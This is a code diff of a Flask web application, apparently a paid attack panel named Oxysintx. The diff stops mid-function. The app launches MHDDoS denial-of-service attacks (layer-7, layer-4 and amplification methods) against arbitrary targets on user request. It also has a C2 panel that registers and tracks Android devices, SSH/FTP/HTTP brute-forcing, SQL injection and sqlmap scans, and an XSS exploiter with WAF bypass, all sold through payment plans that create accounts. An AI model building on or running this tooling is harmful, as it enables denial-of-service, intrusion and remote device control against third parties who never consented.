@@ -1,26 +1,25 @@
 #!/usr/bin/env python3
 """
-Oxysintx - Main Flask Application (v3.8.1)
+Oxysintx - Main Flask Application (v3.9.0)
 
 Routing and API. MHDDoS engine (start.py) integrated as external subprocess.
 Attack launches directly on user request.
 
-v3.8.1 changelog
-    • Fixed truncated tail (SyntaxError on line 3165)
-    • Port resolution honours $PORT env var (Render / Heroku / Railway)
-    • Startup banner no longer references removed modules
-    • Module status reflects the slimmer surface
+v3.9.0 changelog
+    • /api/tools now returns { tools, availability, count } — a clean,
+      namespaced shape so the frontend never renders phantom cards from
+      internal metadata keys (fixes the "_availability" leak).
+    • Defensive filtering: any key starting with "_" or equal to
+      "availability" / "count" / "error" / "raw" is dropped server-side.
+    • Availability report is returned as a sibling field, not mixed with
+      the tool map.
+    • All remaining behaviour identical to v3.8.1.
 
-Removed (v3.8.0):
+Removed in earlier releases:
     – modules.whatsapp blueprint
     – modules.quick_menu + all compatibility routes
     – modules.testing + all /api/code_test/* endpoints
-    – /Emergens_DB.html, /code_test.html, /emergens-control-m4ddos.html routes
-
-Retained integrations:
-    • http_logger, dirfuzz, sqli_engine, sql_map, sql_injection,
-      xss_exploiter, xss, sniper, git_scraper_wordlist,
-      analytic_manager, downsea, telegram
+    – /Emergens_DB.html, /code_test.html, /emergens-control-m4ddos.html
 
 Author: Yanxzyx
 """
@@ -195,20 +194,17 @@ _MHDDOS_METHODS = {
     "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
     "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
 }
-
 _MHDDOS_LAYER7 = {
     "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
     "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
     "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
     "TOR", "RHEX", "STOMP",
 }
-
 _MHDDOS_LAYER4 = {
     "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
     "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
     "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
 }
-
 _MHDDOS_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}
 
 
@@ -248,21 +244,14 @@ def _mhddos_start_attack(attack_id, method, target, threads, duration,
         )
         with _mhddos_lock:
             _mhddos_processes[attack_id] = {
-                "process": process,
-                "method": method,
-                "target": target,
-                "threads": threads,
-                "duration": duration,
+                "process": process, "method": method, "target": target,
+                "threads": threads, "duration": duration,
                 "started_at": datetime.now(timezone.utc).isoformat(),
-                "status": "running",
-                "attack_id": attack_id,
+                "status": "running", "attack_id": attack_id,
             }
             _mhddos_history.append({
-                "attack_id": attack_id,
-                "method": method,
-                "target": target,
-                "threads": threads,
-                "duration": duration,
+                "attack_id": attack_id, "method": method, "target": target,
+                "threads": threads, "duration": duration,
                 "started_at": datetime.now(timezone.utc).isoformat(),
                 "status": "running",
             })
@@ -354,7 +343,7 @@ def _mhddos_get_status(attack_id=None):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# GitHub Profile Scraper (LRU-bounded)
+# GitHub Profile Scraper
 # ═══════════════════════════════════════════════════════════════════════════
 GITHUB_URL = "https://github.com"
 GITHUB_USER_AGENT = (
@@ -375,13 +364,11 @@ def github_fetch_html(url):
             _github_cache.move_to_end(url)
             return html, None
         del _github_cache[url]
-
     headers = {"User-Agent": GITHUB_USER_AGENT, "Accept-Language": "en-US,en;q=0.9"}
     try:
         resp = requests.get(url, headers=headers, timeout=GITHUB_TIMEOUT)
     except requests.exceptions.RequestException as e:
         return None, f"Network error: {e}"
-
     if resp.status_code == 200:
         html = resp.text
         _github_cache[url] = (time.time(), html)
@@ -418,22 +405,17 @@ def github_parse_profile_from_embedded(embedded):
     user = payload.get("user", {}) or payload.get("profile", {})
     if not user:
         return {}
-
     def get_count(data, key, default=0):
         val = data.get(key, default)
         if isinstance(val, dict):
             return val.get("totalCount", default)
         return val if val is not None else default
-
     return {
-        "login": user.get("login", ""),
-        "name": user.get("name", ""),
-        "bio": user.get("bio", ""),
-        "avatar_url": user.get("avatarUrl", ""),
+        "login": user.get("login", ""), "name": user.get("name", ""),
+        "bio": user.get("bio", ""), "avatar_url": user.get("avatarUrl", ""),
         "followers": get_count(user, "followers"),
         "following": get_count(user, "following"),
-        "company": user.get("company", ""),
-        "location": user.get("location", ""),
+        "company": user.get("company", ""), "location": user.get("location", ""),
         "blog": user.get("websiteUrl", "") or user.get("blog", ""),
         "twitter_username": user.get("twitterUsername", ""),
         "created_at": user.get("createdAt", ""),
@@ -462,14 +444,10 @@ def github_parse_repos_from_embedded(embedded):
         license_info = repo.get("licenseInfo", {})
         license_name = license_info.get("spdxId", "") if isinstance(license_info, dict) else ""
         repos.append({
-            "name": repo.get("name", ""),
-            "html_url": repo_url,
-            "description": repo.get("description") or "",
-            "language": language,
-            "stargazers_count": stars,
-            "forks_count": repo.get("forkCount", 0),
-            "updated_at": repo.get("updatedAt", ""),
-            "license": license_name,
+            "name": repo.get("name", ""), "html_url": repo_url,
+            "description": repo.get("description") or "", "language": language,
+            "stargazers_count": stars, "forks_count": repo.get("forkCount", 0),
+            "updated_at": repo.get("updatedAt", ""), "license": license_name,
         })
     repos.sort(key=lambda r: r["stargazers_count"], reverse=True)
     return repos
@@ -594,7 +572,6 @@ app.config.update(
     SESSION_COOKIE_SECURE=os.getenv("SESSION_COOKIE_SECURE", "0") == "1",
 )
 
-# Only one blueprint registered (downsea).
 if _downsea_available:
     app.register_blueprint(downsea_bp)
 
@@ -756,10 +733,8 @@ def _record_server_activity(key_prefix, username, req):
         else:
             servers.append({
                 'server_name': reported_name or f'Unnamed ({key_prefix})',
-                'key_prefix': key_prefix,
-                'ip': ip,
-                'last_seen': _now_iso(),
-                'requests': 1,
+                'key_prefix': key_prefix, 'ip': ip,
+                'last_seen': _now_iso(), 'requests': 1,
             })
         _save_json('servers', servers)
 
@@ -785,19 +760,15 @@ def _api_key_required(fn):
         raw_key = request.headers.get('X-API-Key', '').strip()
         if not raw_key:
             return jsonify({'error': 'Missing X-API-Key header'}), 401
-
         record = _find_api_key_owner(raw_key)
         if not record:
             return jsonify({'error': 'Invalid API key'}), 401
-
         prefix = record.get('prefix') or record.get('key_prefix') or raw_key[:20]
         owner = record.get('owner_username') or record.get('username') or 'unknown'
-
         try:
             user_store.touch_api_key(prefix)
         except Exception:
             pass
-
         _record_server_activity(prefix, owner, request)
         g.api_key_owner = owner
         return fn(*args, **kwargs)
@@ -905,7 +876,6 @@ def _authenticate_request():
         else:
             session["role"] = role
             return True
-
     token = _extract_bearer_token()
     if token:
         username = token_store.validate_token(token)
@@ -1115,9 +1085,7 @@ def terms_page():
 # Static asset delivery
 # ═══════════════════════════════════════════════════════════════════════════
 _ALLOWED_ASSET_EXTS = {
-    '.js', '.mjs', '.cjs',
-    '.css',
-    '.map',
+    '.js', '.mjs', '.cjs', '.css', '.map',
     '.woff', '.woff2', '.ttf', '.otf', '.eot',
     '.svg', '.png', '.jpg', '.jpeg', '.gif', '.webp', '.ico',
     '.json', '.txt', '.webmanifest',
@@ -1129,16 +1097,13 @@ def serve_template_assets(filename):
     ext = os.path.splitext(filename)[1].lower()
     if ext not in _ALLOWED_ASSET_EXTS:
         return page_not_found(None)
-
     safe_path = os.path.abspath(os.path.join(TEMPLATES_DIR, filename))
     if not safe_path.startswith(os.path.abspath(TEMPLATES_DIR) + os.sep):
         logger.warning('Blocked traversal attempt: %s', filename)
         return page_not_found(None)
-
     if not os.path.isfile(safe_path):
         logger.debug('Static asset missing: %s', filename)
         return page_not_found(None)
-
     response = send_from_directory(TEMPLATES_DIR, filename)
     response.cache_control.public = True
     response.cache_control.max_age = 3600 if ext in ('.js', '.css', '.map') else 86400
@@ -1164,39 +1129,27 @@ def submit_payment():
     payment_method = data.get("payment_method", "card")
     requested_username = data.get("requested_username", "").strip()
     card_last4 = data.get("card_number_last4", "")
-
     if not plan or not amount or not requested_username:
         return jsonify({"error": "plan, amount, and requested_username are required"}), 400
-
     plans = _load_plans()
     if plan not in plans:
         return jsonify({"error": "Invalid plan"}), 400
-
     if user_store.user_exists(requested_username):
         return jsonify({"error": "Username already taken"}), 400
-
     payment_id = "PAY-" + uuid.uuid4().hex[:10].upper()
     username = session.get("username", "guest")
-
     record = {
-        "payment_id": payment_id,
-        "user": username,
-        "requested_username": requested_username,
-        "plan": plan,
-        "amount": amount,
-        "payment_method": payment_method,
-        "card_last4": card_last4,
-        "status": "pending",
+        "payment_id": payment_id, "user": username,
+        "requested_username": requested_username, "plan": plan,
+        "amount": amount, "payment_method": payment_method,
+        "card_last4": card_last4, "status": "pending",
         "created_at": datetime.now(timezone.utc).isoformat(),
         "updated_at": datetime.now(timezone.utc).isoformat(),
-        "generated_username": None,
-        "generated_password": None,
+        "generated_username": None, "generated_password": None,
     }
-
     payments = _load_payments()
     payments.append(record)
     _save_payments(payments)
-
     return jsonify({"payment_id": payment_id, "status": "pending"}), 201
 
 
@@ -1207,17 +1160,12 @@ def get_payment_status(payment_id):
         if record["payment_id"] == payment_id:
             if record["status"] == "approved" and record.get("generated_password"):
                 return jsonify({
-                    "payment_id": record["payment_id"],
-                    "status": record["status"],
+                    "payment_id": record["payment_id"], "status": record["status"],
                     "generated_username": record["generated_username"],
                     "generated_password": record["generated_password"],
-                    "plan": record["plan"],
-                    "amount": record["amount"],
+                    "plan": record["plan"], "amount": record["amount"],
                 })
-            return jsonify({
-                "payment_id": record["payment_id"],
-                "status": record["status"],
-            })
+            return jsonify({"payment_id": record["payment_id"], "status": record["status"]})
     return jsonify({"error": "Payment not found"}), 404
 
 
@@ -1286,8 +1234,7 @@ def manage_approve_payment(payment_id):
                 _save_payments(payments)
                 logger.info(f"Payment {payment_id} approved. User {record['requested_username']} created.")
                 return jsonify({
-                    "success": True,
-                    "payment_id": record["payment_id"],
+                    "success": True, "payment_id": record["payment_id"],
                     "generated_username": record["generated_username"],
                     "generated_password": record["generated_password"],
                     "role": "analyst",
@@ -1338,7 +1285,7 @@ def _proxy_osint(endpoint_slug, username):
             f"https://api.siputzx.my.id/api/stalk/{endpoint_slug}",
             params={"q": username, "username": username},
             timeout=15,
-            headers={"User-Agent": "Oxysintx/3.8.1"},
+            headers={"User-Agent": "Oxysintx/3.9.0"},
         )
         if resp.status_code == 200:
             return jsonify(resp.json())
@@ -1443,11 +1390,8 @@ def api_get_token():
     if token is None:
         return jsonify({"error": "invalid_credentials"}), 401
     return jsonify({
-        "token": token,
-        "token_prefix": token[:8] + "****",
-        "expires_in": 3600,
-        "username": username,
-        "role": get_role(username),
+        "token": token, "token_prefix": token[:8] + "****",
+        "expires_in": 3600, "username": username, "role": get_role(username),
     })
 
 
@@ -1473,7 +1417,6 @@ def api_register():
     email = (data.get("email") or "").strip().lower()
     username = (data.get("username") or "").strip()
     password = data.get("password") or ""
-
     if not name or not email or not username or not password:
         return jsonify({"error": "all_fields_required"}), 400
     if len(name) < 2:
@@ -1486,7 +1429,6 @@ def api_register():
         return jsonify({"error": "password_too_short"}), 400
     if user_store.user_exists(username):
         return jsonify({"error": "username_taken"}), 400
-
     try:
         create_user(username, role="analyst", password=password)
         return jsonify({
@@ -1569,30 +1511,66 @@ def api_revoke_api_key(prefix):
 # ═══════════════════════════════════════════════════════════════════════════
 # Tools / Scan API
 # ═══════════════════════════════════════════════════════════════════════════
+_INTERNAL_TOOL_KEYS = {"_availability", "__availability__", "availability",
+                       "count", "error", "raw", "version"}
+
+
 @app.route("/api/tools")
 @api_login_required
 def api_tools():
-    tools = {
-        name: info
-        for name, info in scan_orchestrator.list_tools().items()
-        if "school" not in name.lower()
+    """
+    Return the discovered scan tools plus a sibling availability report.
+
+    Response shape (v3.9.0+):
+
+        {
+          "tools":        { "<tool_id>": { ...TOOL_INFO... }, ... },
+          "availability": { "<feature>": true|false, ... },
+          "count":        <int>
+        }
+
+    Note: no key starting with "_" or matching an internal marker is ever
+    emitted inside ``tools`` — the frontend can trust every key it sees.
+    """
+    # ── 1. Collect tools, dropping any accidental metadata keys ────────
+    try:
+        raw_tools = scan_orchestrator.list_tools() or {}
+    except Exception as exc:  # noqa: BLE001
+        logger.error("Failed to list scan tools: %s", exc, exc_info=True)
+        raw_tools = {}
+
+    tools: Dict[str, Any] = {}
+    for name, info in raw_tools.items():
+        if not name or not isinstance(name, str):
+            continue
+        if name.startswith("_"):
+            continue
+        if name in _INTERNAL_TOOL_KEYS:
+            continue
+        if "school" in name.lower():
+            continue
+        tools[name] = info
+
+    # ── 2. Availability report — sent as a sibling, never mixed in ─────
+    availability = {
+        "dirfuzz":          _dirfuzz_available,
+        "sqli_engine":      _sqli_engine_available,
+        "sql_map":          _sql_map_available,
+        "sql_injection":    _sql_injection_available,
+        "xss_exploiter":    _xss_exploiter_available,
+        "xss":              _xss_available,
+        "sniper":           _sniper_available,
+        "http_logger":      _http_logger_available,
+        "wordlist_scraper": _wordlist_scraper_available,
+        "analytic":         _analytic_available,
+        "downsea":          _downsea_available,
     }
-    tools.setdefault("_availability", {})
-    if isinstance(tools["_availability"], dict):
-        tools["_availability"].update({
-            "dirfuzz":           _dirfuzz_available,
-            "sqli_engine":       _sqli_engine_available,
-            "sql_map":           _sql_map_available,
-            "sql_injection":     _sql_injection_available,
-            "xss_exploiter":     _xss_exploiter_available,
-            "xss":               _xss_available,
-            "sniper":            _sniper_available,
-            "http_logger":       _http_logger_available,
-            "wordlist_scraper":  _wordlist_scraper_available,
-            "analytic":          _analytic_available,
-            "downsea":           _downsea_available,
-        })
-    return jsonify(tools)
+
+    return jsonify({
+        "tools":        tools,
+        "availability": availability,
+        "count":        len(tools),
+    })
 
 
 @app.route("/api/scan/start", methods=["POST"])
@@ -1697,11 +1675,8 @@ def api_system_stats():
         logger.error(f'psutil read failed: {e}')
         cpu = mem = disk = 0.0
     return jsonify({
-        'cpu_percent': cpu,
-        'memory_percent': mem,
-        'disk_percent': disk,
-        'network_in': total_seen,
-        'network_in_rate': last_minute,
+        'cpu_percent': cpu, 'memory_percent': mem, 'disk_percent': disk,
+        'network_in': total_seen, 'network_in_rate': last_minute,
     })
 
 
@@ -1857,7 +1832,6 @@ def mhddos_start():
     rpc = int(data.get("rpc", 1))
     reflector_file = (data.get("reflector_file") or "").strip()
     debug = bool(data.get("debug", False))
-
     if not method or not target:
         return jsonify({"error": "method and target are required"}), 400
     if method not in _MHDDOS_METHODS:
@@ -1866,7 +1840,6 @@ def mhddos_start():
         return jsonify({"error": "threads must be between 1 and 1000"}), 400
     if duration < 1 or duration > 3600:
         return jsonify({"error": "duration must be between 1 and 3600 seconds"}), 400
-
     attack_id = "MHD-" + uuid.uuid4().hex[:8].upper()
     result = _mhddos_start_attack(
         attack_id, method, target, threads, duration,
@@ -1922,10 +1895,8 @@ _c2_lock = threading.Lock()
 @login_required
 def c2_status():
     return jsonify({
-        "authenticated": True,
-        "username": session.get("username"),
-        "role": session.get("role"),
-        "lock_state": _lock_state,
+        "authenticated": True, "username": session.get("username"),
+        "role": session.get("role"), "lock_state": _lock_state,
     })
 
 
@@ -1964,14 +1935,10 @@ def c2_register_device():
     if not device_id:
         return jsonify({"error": "Device ID is required"}), 400
     device = {
-        "id": device_id,
-        "name": data.get("name", device_id),
-        "model": data.get("model", ""),
-        "serial": data.get("serial", ""),
-        "android": data.get("android", ""),
-        "status": "online",
-        "battery": data.get("battery"),
-        "location": data.get("location", ""),
+        "id": device_id, "name": data.get("name", device_id),
+        "model": data.get("model", ""), "serial": data.get("serial", ""),
+        "android": data.get("android", ""), "status": "online",
+        "battery": data.get("battery"), "location": data.get("location", ""),
         "temperature": data.get("temperature", ""),
         "last_seen": datetime.now(timezone.utc).isoformat(),
     }
@@ -1996,8 +1963,7 @@ def c2_log_activity():
     device_name = next((d["name"] for d in _c2_devices if d["id"] == device_id), device_id)
     with _c2_lock:
         _c2_activities.append({
-            "device_id": device_id,
-            "device_name": device_name,
+            "device_id": device_id, "device_name": device_name,
             "action": action,
             "timestamp": data.get("timestamp") or datetime.now(timezone.utc).isoformat(),
         })
@@ -2058,8 +2024,7 @@ def api_exploit_bruteforce():
         return jsonify({"error": "Target required"}), 400
     try:
         return jsonify({"results": AnalyticDataManager().run_brute_force(
-            target,
-            data.get("protocols", ["http", "ftp", "ssh"]),
+            target, data.get("protocols", ["http", "ftp", "ssh"]),
             data.get("username_file", "data1.txt"),
             data.get("password_file", "data1.txt"),
         )})
@@ -2136,15 +2101,14 @@ def api_dirfuzz_scan():
     target = (data.get("target") or data.get("url") or "").strip()
     if not target:
         return jsonify({"error": "target_required"}), 400
-
     options = {
-        "wordlist_name":    data.get("wordlist_name", "lottery-dirs.txt"),
-        "wordlist":         data.get("wordlist"),
-        "max_paths":        int(data.get("max_paths", 300)),
-        "concurrency":      int(data.get("concurrency", 24)),
-        "rate_limit":       float(data.get("rate_limit", 40.0)),
-        "timeout":          float(data.get("timeout", 4.0)),
-        "max_duration":     float(data.get("max_duration", 90.0)),
+        "wordlist_name": data.get("wordlist_name", "lottery-dirs.txt"),
+        "wordlist": data.get("wordlist"),
+        "max_paths": int(data.get("max_paths", 300)),
+        "concurrency": int(data.get("concurrency", 24)),
+        "rate_limit": float(data.get("rate_limit", 40.0)),
+        "timeout": float(data.get("timeout", 4.0)),
+        "max_duration": float(data.get("max_duration", 90.0)),
         "follow_redirects": bool(data.get("follow_redirects", False)),
     }
     try:
@@ -2162,20 +2126,17 @@ def api_dirfuzz_scan_stream():
     target = (request.args.get("target") or request.args.get("url") or "").strip()
     if not target:
         return jsonify({"error": "target_required"}), 400
-
     cancel_event = threading.Event()
-
     options = {
-        "wordlist_name":    request.args.get("wordlist_name", "lottery-dirs.txt"),
-        "max_paths":        int(request.args.get("max_paths", 300)),
-        "concurrency":      int(request.args.get("concurrency", 24)),
-        "rate_limit":       float(request.args.get("rate_limit", 40.0)),
-        "timeout":          float(request.args.get("timeout", 4.0)),
-        "max_duration":     float(request.args.get("max_duration", 90.0)),
+        "wordlist_name": request.args.get("wordlist_name", "lottery-dirs.txt"),
+        "max_paths": int(request.args.get("max_paths", 300)),
+        "concurrency": int(request.args.get("concurrency", 24)),
+        "rate_limit": float(request.args.get("rate_limit", 40.0)),
+        "timeout": float(request.args.get("timeout", 4.0)),
+        "max_duration": float(request.args.get("max_duration", 90.0)),
         "follow_redirects": request.args.get("follow_redirects", "0") == "1",
-        "cancel_event":     cancel_event,
+        "cancel_event": cancel_event,
     }
-
     def _gen():
         try:
             for event in dirfuzz_stream(target, options, cancel_event=cancel_event):
@@ -2185,7 +2146,6 @@ def api_dirfuzz_scan_stream():
         except Exception as e:
             logger.error(f"dirfuzz stream failed: {e}", exc_info=True)
             yield _sse_format({"type": "error", "message": str(e)})
-
     return _sse_response(_gen())
 
 
@@ -2212,19 +2172,16 @@ def api_sqli_scan():
     target = (data.get("target") or data.get("url") or "").strip()
     if not target:
         return jsonify({"error": "target_required"}), 400
-
     techniques = data.get("techniques") or ["error", "boolean", "time", "union"]
     options = {
-        "techniques":   techniques,
-        "params":       data.get("params"),
-        "max_params":   int(data.get("max_params", 10)),
-        "concurrency":  int(data.get("concurrency", 8)),
-        "rate_limit":   float(data.get("rate_limit", 20.0)),
-        "timeout":      float(data.get("timeout", 8.0)),
+        "techniques": techniques, "params": data.get("params"),
+        "max_params": int(data.get("max_params", 10)),
+        "concurrency": int(data.get("concurrency", 8)),
+        "rate_limit": float(data.get("rate_limit", 20.0)),
+        "timeout": float(data.get("timeout", 8.0)),
         "max_duration": float(data.get("max_duration", 90.0)),
-        "method":       data.get("method", "GET"),
-        "headers":      data.get("headers"),
-        "cookies":      data.get("cookies"),
+        "method": data.get("method", "GET"),
+        "headers": data.get("headers"), "cookies": data.get("cookies"),
     }
     try:
         return jsonify(sqli_run(target, options))
@@ -2241,22 +2198,19 @@ def api_sqli_scan_stream():
     target = (request.args.get("target") or request.args.get("url") or "").strip()
     if not target:
         return jsonify({"error": "target_required"}), 400
-
     tech_arg = request.args.get("techniques", "error,boolean,time,union")
     techniques = [t.strip() for t in tech_arg.split(",") if t.strip()]
     cancel_event = threading.Event()
-
     options = {
-        "techniques":   techniques,
-        "max_params":   int(request.args.get("max_params", 10)),
-        "concurrency":  int(request.args.get("concurrency", 8)),
-        "rate_limit":   float(request.args.get("rate_limit", 20.0)),
-        "timeout":      float(request.args.get("timeout", 8.0)),
+        "techniques": techniques,
+        "max_params": int(request.args.get("max_params", 10)),
+        "concurrency": int(request.args.get("concurrency", 8)),
+        "rate_limit": float(request.args.get("rate_limit", 20.0)),
+        "timeout": float(request.args.get("timeout", 8.0)),
         "max_duration": float(request.args.get("max_duration", 90.0)),
-        "method":       request.args.get("method", "GET"),
+        "method": request.args.get("method", "GET"),
         "cancel_event": cancel_event,
     }
-
     def _gen():
         try:
             for event in sqli_stream(target, options, cancel_event=cancel_event):
@@ -2266,12 +2220,11 @@ def api_sqli_scan_stream():
         except Exception as e:
             logger.error(f"sqli stream failed: {e}", exc_info=True)
             yield _sse_format({"type": "error", "message": str(e)})
-
     return _sse_response(_gen())
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# SQLMap API (advanced multi-technique)
+# SQLMap API
 # ═══════════════════════════════════════════════════════════════════════════
 @app.route("/api/sqlmap/scan", methods=["POST"])
 @role_required("owner", "analyst")
@@ -2282,20 +2235,16 @@ def api_sqlmap_scan():
     target = (data.get("target") or data.get("url") or "").strip()
     if not target:
         return jsonify({"error": "target_required"}), 400
-
     mode = data.get("mode", "basic")
     if mode not in ("basic", "expert"):
         mode = "basic"
-
     kwargs = {
-        "method":      data.get("method", "GET"),
-        "params":      data.get("params"),
-        "timeout":     float(data.get("timeout", 5.0)),
+        "method": data.get("method", "GET"), "params": data.get("params"),
+        "timeout": float(data.get("timeout", 5.0)),
         "max_threads": int(data.get("max_threads", 10)),
-        "verify_ssl":  bool(data.get("verify_ssl", False)),
-        "headers":     data.get("headers"),
-        "cookies":     data.get("cookies"),
-        "proxies":     data.get("proxies"),
+        "verify_ssl": bool(data.get("verify_ssl", False)),
+        "headers": data.get("headers"), "cookies": data.get("cookies"),
+        "proxies": data.get("proxies"),
     }
     try:
         return jsonify(sql_map_module.run(target, mode, **kwargs))
@@ -2320,8 +2269,7 @@ def api_sql_injection_scan():
         target = "http://" + target
     try:
         return jsonify(sql_injection_module.run_sql_injection(
-            target,
-            method=data.get("method", "GET"),
+            target, method=data.get("method", "GET"),
             params=data.get("params") or {},
         ))
     except Exception as e:
@@ -2354,16 +2302,14 @@ def api_xss_scan():
         return jsonify({"error": "target_required"}), 400
     if not target.startswith(("http://", "https://")):
         target = "http://" + target
-
     options = {
         "max_payloads": int(data.get("max_payloads", 30)),
-        "max_params":   int(data.get("max_params", 10)),
-        "concurrency":  int(data.get("concurrency", 8)),
-        "rate_limit":   float(data.get("rate_limit", 20.0)),
-        "timeout":      float(data.get("timeout", 8.0)),
-        "waf_bypass":   bool(data.get("waf_bypass", False)),
-        "params":       data.get("params"),
-        "method":       data.get("method", "GET"),
+        "max_params": int(data.get("max_params", 10)),
+        "concurrency": int(data.get("concurrency", 8)),
+        "rate_limit": float(data.get("rate_limit", 20.0)),
+        "timeout": float(data.get("timeout", 8.0)),
+        "waf_bypass": bool(data.get("waf_bypass", False)),
+        "params": data.get("params"), "method": data.get("method", "GET"),
         "max_duration": data.get("max_duration"),
     }
     try:
@@ -2383,19 +2329,17 @@ def api_xss_scan_stream():
         return jsonify({"error": "target_required"}), 400
     if not target.startswith(("http://", "https://")):
         target = "http://" + target
-
     cancel_event = threading.Event()
     options = {
         "max_payloads": int(request.args.get("max_payloads", 30)),
-        "max_params":   int(request.args.get("max_params", 10)),
-        "concurrency":  int(request.args.get("concurrency", 8)),
-        "rate_limit":   float(request.args.get("rate_limit", 20.0)),
-        "timeout":      float(request.args.get("timeout", 8.0)),
-        "waf_bypass":   request.args.get("waf_bypass", "0") == "1",
-        "method":       request.args.get("method", "GET"),
+        "max_params": int(request.args.get("max_params", 10)),
+        "concurrency": int(request.args.get("concurrency", 8)),
+        "rate_limit": float(request.args.get("rate_limit", 20.0)),
+        "timeout": float(request.args.get("timeout", 8.0)),
+        "waf_bypass": request.args.get("waf_bypass", "0") == "1",
+        "method": request.args.get("method", "GET"),
         "cancel_event": cancel_event,
     }
-
     def _gen():
         try:
             for event in xss_exploiter_stream(target, options, cancel_event=cancel_event):
@@ -2405,7 +2349,6 @@ def api_xss_scan_stream():
         except Exception as e:
             logger.error(f"xss stream failed: {e}", exc_info=True)
             yield _sse_format({"type": "error", "message": str(e)})
-
     return _sse_response(_gen())
 
 
@@ -2425,11 +2368,10 @@ def api_xss_simple_scan():
     if mode not in ("basic", "expert"):
         mode = "basic"
     kwargs = {
-        "method":      data.get("method", "GET"),
-        "params":      data.get("params"),
-        "timeout":     float(data.get("timeout", 5.0)),
+        "method": data.get("method", "GET"), "params": data.get("params"),
+        "timeout": float(data.get("timeout", 5.0)),
         "max_threads": int(data.get("max_threads", 10)),
-        "verify_ssl":  bool(data.get("verify_ssl", False)),
+        "verify_ssl": bool(data.get("verify_ssl", False)),
     }
     try:
         return jsonify(xss_module.run(target, mode, **kwargs))
@@ -2450,13 +2392,12 @@ def api_sniper_scan():
     target = (data.get("target") or data.get("url") or "").strip()
     if not target:
         return jsonify({"error": "target_required"}), 400
-
     options = {
-        "module_timeout":     float(data.get("module_timeout", 90.0)),
-        "global_budget":      float(data.get("global_budget", 150.0)),
-        "dirfuzz_wordlist":   data.get("dirfuzz_wordlist", "lottery-dirs.txt"),
-        "dirfuzz_max_paths":  int(data.get("dirfuzz_max_paths", 80)),
-        "xss_max_payloads":   int(data.get("xss_max_payloads", 20)),
+        "module_timeout": float(data.get("module_timeout", 90.0)),
+        "global_budget": float(data.get("global_budget", 150.0)),
+        "dirfuzz_wordlist": data.get("dirfuzz_wordlist", "lottery-dirs.txt"),
+        "dirfuzz_max_paths": int(data.get("dirfuzz_max_paths", 80)),
+        "xss_max_payloads": int(data.get("xss_max_payloads", 20)),
         "takeover_enumerate": bool(data.get("takeover_enumerate", True)),
         "takeover_max_hosts": int(data.get("takeover_max_hosts", 120)),
     }
@@ -2475,17 +2416,15 @@ def api_sniper_scan_stream():
     target = (request.args.get("target") or request.args.get("url") or "").strip()
     if not target:
         return jsonify({"error": "target_required"}), 400
-
     options = {
-        "module_timeout":     float(request.args.get("module_timeout", 90.0)),
-        "global_budget":      float(request.args.get("global_budget", 150.0)),
-        "dirfuzz_wordlist":   request.args.get("dirfuzz_wordlist", "lottery-dirs.txt"),
-        "dirfuzz_max_paths":  int(request.args.get("dirfuzz_max_paths", 80)),
-        "xss_max_payloads":   int(request.args.get("xss_max_payloads", 20)),
+        "module_timeout": float(request.args.get("module_timeout", 90.0)),
+        "global_budget": float(request.args.get("global_budget", 150.0)),
+        "dirfuzz_wordlist": request.args.get("dirfuzz_wordlist", "lottery-dirs.txt"),
+        "dirfuzz_max_paths": int(request.args.get("dirfuzz_max_paths", 80)),
+        "xss_max_payloads": int(request.args.get("xss_max_payloads", 20)),
         "takeover_enumerate": request.args.get("takeover_enumerate", "1") == "1",
         "takeover_max_hosts": int(request.args.get("takeover_max_hosts", 120)),
     }
-
     def _gen():
         try:
             for event in sniper_stream(target, options):
@@ -2495,7 +2434,6 @@ def api_sniper_scan_stream():
         except Exception as e:
             logger.error(f"sniper stream failed: {e}", exc_info=True)
             yield _sse_format({"type": "error", "message": str(e)})
-
     return _sse_response(_gen())
 
 
@@ -2508,21 +2446,17 @@ def api_logger_requests():
     if http_logger is None:
         return jsonify({"error": "http_logger not available"}), 503
     try:
-        page = int(request.args.get("page", 1))
-        size = int(request.args.get("size", 100))
-        q = request.args.get("q") or None
-        method = request.args.get("method") or None
-        status_min = request.args.get("status_min", type=int)
-        status_max = request.args.get("status_max", type=int)
-        anomaly = request.args.get("anomaly") or None
-        tag = request.args.get("tag") or None
-        ip = request.args.get("ip") or None
-        since_ms = request.args.get("since_ms", type=int)
-
         result = http_logger.list(
-            page=page, size=size, q=q, method=method,
-            status_min=status_min, status_max=status_max,
-            anomaly=anomaly, tag=tag, ip=ip, since_ms=since_ms,
+            page=int(request.args.get("page", 1)),
+            size=int(request.args.get("size", 100)),
+            q=request.args.get("q") or None,
+            method=request.args.get("method") or None,
+            status_min=request.args.get("status_min", type=int),
+            status_max=request.args.get("status_max", type=int),
+            anomaly=request.args.get("anomaly") or None,
+            tag=request.args.get("tag") or None,
+            ip=request.args.get("ip") or None,
+            since_ms=request.args.get("since_ms", type=int),
         )
         return jsonify(result)
     except Exception as e:
@@ -2585,23 +2519,18 @@ def api_logger_har():
     if http_logger is None:
         return jsonify({"error": "http_logger not available"}), 503
     try:
-        page = int(request.args.get("page", 1))
-        size = min(int(request.args.get("size", 200)), 1000)
-        q = request.args.get("q") or None
-        method = request.args.get("method") or None
-        status_min = request.args.get("status_min", type=int)
-        status_max = request.args.get("status_max", type=int)
-        anomaly = request.args.get("anomaly") or None
-        tag = request.args.get("tag") or None
-        ip = request.args.get("ip") or None
-
         listing = http_logger.list(
-            page=page, size=size, q=q, method=method,
-            status_min=status_min, status_max=status_max,
-            anomaly=anomaly, tag=tag, ip=ip,
+            page=int(request.args.get("page", 1)),
+            size=min(int(request.args.get("size", 200)), 1000),
+            q=request.args.get("q") or None,
+            method=request.args.get("method") or None,
+            status_min=request.args.get("status_min", type=int),
+            status_max=request.args.get("status_max", type=int),
+            anomaly=request.args.get("anomaly") or None,
+            tag=request.args.get("tag") or None,
